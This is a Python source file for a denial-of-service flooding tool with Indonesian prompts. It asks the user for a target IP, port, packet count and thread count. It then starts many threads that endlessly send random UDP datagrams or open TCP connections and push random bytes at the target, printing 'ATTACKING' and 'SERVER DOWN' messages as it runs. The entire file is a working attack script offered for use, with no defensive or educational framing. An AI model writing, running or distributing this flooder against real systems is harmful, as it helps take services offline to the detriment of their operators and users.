import random
import socket
import threading
import time
import os,sys

os.system("clear")
print("""
\033[31m     ╱╱╭┳━━━┳╮╭╮╭┳━━━╮
\033[31m     ╱╱┃┃╭━╮┃┃┃┃┃┃╭━╮┃
\033[31m     ╱╱┃┃┃╱┃┃┃┃┃┃┃┃╱┃┃
\033[31m     ╭╮┃┃╰━╯┃╰╯╰╯┃╰━╯┃
\033[31m     ┃╰╯┃╭━╮┣╮╭╮╭┫╭━╮┃
\033[31m     ╰━━┻╯╱╰╯╰╯╰╯╰╯╱╰╯
              
""")
print("\033[31m━━━ ᴹᴬᵁ ᴰᴰᴼᔆ ? (y/n)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ 𝙸𝙿 𝚃𝙰𝚁𝙶𝙴𝚃𝙽𝚈𝙰")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ 𝙿𝙾𝚁𝚃 𝚃𝙰𝚁𝙶𝙴𝙽𝚈𝙰")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ 𝙿𝙰𝙺𝙴𝚃𝚂")	
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ 𝚃𝙷𝚁𝙴𝙰𝙳𝚂")
threads = int(input("┗━━━━━━>\033[0m:"))
def run1():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Servernya Down Yahh ! ! !")

def run2():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run3():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run4():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run5():
  data = random._urandom(320)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run6():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run7():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run8():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run9():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run10():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run11():
  data = random._urandom(1024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run12():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run13():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run14():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

def run15():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] 𝚂𝙴𝚁𝚅𝙴𝚁 𝙳𝙾𝚆𝙽!!!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run1)
    th.start()
    th = threading.Thread(target = run2)
    th.start()
    th = threading.Thread(target = run3)
    th.start()
    th = threading.Thread(target = run4)
    th.start()
    th = threading.Thread(target = run5)
    th.start()
    th = threading.Thread(target = run6)
    th.start()
    th = threading.Thread(target = run7)
    th.start()
    th = threading.Thread(target = run8)
    th.start()
  else:
    th = threading.Thread(target = run9)
    th.start()
    th = threading.Thread(target = run10)
    th.start()
    th = threading.Thread(target = run11)
    th.start()
    th = threading.Thread(target = run12)
    th.start()
    th = threading.Thread(target = run13)
    th.start()
    th = threading.Thread(target = run14)
    th.start()
    th = threading.Thread(target = run15)
    th.start()

